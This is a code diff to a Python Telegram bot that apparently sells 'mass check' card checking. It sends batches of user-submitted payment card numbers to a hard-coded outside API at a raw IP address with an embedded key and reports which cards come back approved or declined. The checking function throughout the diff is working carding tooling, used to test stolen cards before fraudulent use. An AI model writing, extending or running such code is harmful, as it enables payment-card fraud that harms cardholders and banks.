@@ -1545,30 +1545,28 @@ async def check_paid_access(user_id: int, update: Update) -> bool:
 
 
 # --- Background card checking ---
-from telegram.helpers import escape_markdown
-import asyncio
 import aiohttp
+import asyncio
 import time
 from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+from db import get_user
 
-# Mocking external functions for a complete example
-async def get_user(user_id):
-    # This is a mock function; replace with your actual database call
-    return {'credits': 100}
-
-async def check_cards_background(bot, chat_id, cards_to_check, user_id, user_first_name, processing_msg, start_time):
+async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
     approved_count = declined_count = checked_count = 0
     results = []
     total_cards = len(cards_to_check)
 
+    # Check user credits
     user_data = await get_user(user_id)
     if not user_data or user_data.get('credits', 0) <= 0:
-        await processing_msg.edit_text(escape_markdown("❌ You don’t have enough credits.", version=2), parse_mode=ParseMode.MARKDOWN_V2)
+        await processing_msg.edit_text("❌ You don’t have enough credits.")
         return
 
-    semaphore = asyncio.Semaphore(10)
+    semaphore = asyncio.Semaphore(10)  # Limit concurrent requests
 
     async with aiohttp.ClientSession() as session:
+
         async def fetch_card(card):
             async with semaphore:
                 api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={card}"
@@ -1585,6 +1583,7 @@ async def check_cards_background(bot, chat_id, cards_to_check, user_id, user_fir
         for coro in asyncio.as_completed(tasks):
             raw, status = await coro
 
+            # Count statuses
             status_lower = status.lower()
             if "approved" in status_lower:
                 approved_count += 1
@@ -1592,7 +1591,7 @@ async def check_cards_background(bot, chat_id, cards_to_check, user_id, user_fir
                 declined_count += 1
             checked_count += 1
 
-            # Fully escape dynamic content
+            # Escape dynamic content for MarkdownV2
             raw_safe = escape_markdown(raw, version=2)
             status_safe = escape_markdown(status, version=2)
             results.append(f"`{raw_safe}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {status_safe}")
@@ -1600,26 +1599,22 @@ async def check_cards_background(bot, chat_id, cards_to_check, user_id, user_fir
             # Update progress every 5 cards or at the end
             if checked_count % 5 == 0 or checked_count == total_cards:
                 current_time_taken = round(time.time() - start_time, 2)
-                
-                # Escape all static strings for MarkdownV2
                 summary = (
                     f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
                     f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
                     f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
                     f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
                     f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken}s\n"
-                    f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸"
+                    f"\n{escape_markdown('𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸', version=2)}"
                 )
-                
-                # Join the results, and then escape the whole message before sending
                 try:
-                    separator = "\n\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\n"
-                    message_text = escape_markdown(summary, version=2) + "\n\n" + separator.join(results[-5:])
+                    separator = "\n--------------------\n"
                     await processing_msg.edit_text(
-                        message_text,
+                        summary + "\n\n" + separator.join(results[-5:]),
                         parse_mode=ParseMode.MARKDOWN_V2
                     )
                 except Exception:
+                    # Ignore Telegram errors for partial updates
                     pass
 
     # Final summary
@@ -1630,14 +1625,17 @@ async def check_cards_background(bot, chat_id, cards_to_check, user_id, user_fir
         f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
         f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
         f"✘ 𝐓𝐢𝐦𝐞↣{final_time_taken}s\n"
-        f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸"
+        f"\n{escape_markdown('𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸', version=2)}"
     )
-    separator = "\n\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\n"
-    message_text = escape_markdown(final_summary, version=2) + "\n\n" + separator.join(results)
-    await processing_msg.edit_text(
-        message_text,
-        parse_mode=ParseMode.MARKDOWN_V2
-    )
+    separator = "\n--------------------\n"
+    try:
+        await processing_msg.edit_text(
+            final_summary + "\n\n" + separator.join(results),
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+    except Exception:
+        pass
+
 
 # --- /mass command ---
 import re
